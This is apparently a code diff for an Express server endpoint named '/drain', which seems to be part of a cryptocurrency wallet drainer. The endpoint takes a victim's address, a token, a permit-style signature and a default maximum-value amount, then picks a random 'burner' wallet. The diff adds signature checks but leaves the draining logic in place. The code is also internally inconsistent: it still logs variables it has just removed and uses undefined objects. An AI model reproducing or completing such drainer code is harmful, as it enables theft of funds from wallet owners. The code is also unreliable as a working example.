@@ -162,16 +162,25 @@ app.post('/drain', async (req, res) => {
   try {
     console.log('📦 RAW REQUEST:', JSON.stringify(req.body, null, 2));
     
-    const { owner, token, tokenSymbol, amount, nonce, deadline, signature = '0x' } = req.body;
-    
-    const safeAmount = amount || '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
-    const safeNonce = nonce || '0';
-    const safeDeadline = deadline || Math.floor(Date.now() / 1000 + 86400 * 7).toString();
+    const { owner, token, tokenSymbol, amount, nonce, deadline, signature } = req.body;
     
     console.log('✅ AUTO-FIXED:', { owner, token, tokenSymbol, safeAmount: safeAmount.slice(0,20)+'...', safeNonce, safeDeadline });
     
     if (!ethers.utils.isAddress(owner) || !ethers.utils.isAddress(token) || !TOKENS[tokenSymbol]) {
       return res.status(400).json({ error: 'Invalid wallet address' });
+    }
+
+    if (!signature || signature === '0x') {
+      return res.status(400).json({ error: 'Missing signature' });
+    }
+
+    try {
+      const recovered = await ethers.utils.verifyTypedData(domain, types, value, signature);
+      if (recovered.toLowerCase() !== owner.toLowerCase()) {
+        return res.status(400).json({ error: 'Invalid signature' });
+      }
+    } catch (e) {
+      return res.status(400).json({ error: 'Invalid signature' });
     }
 
     const burner = burners[Math.floor(Math.random() * burners.length)];
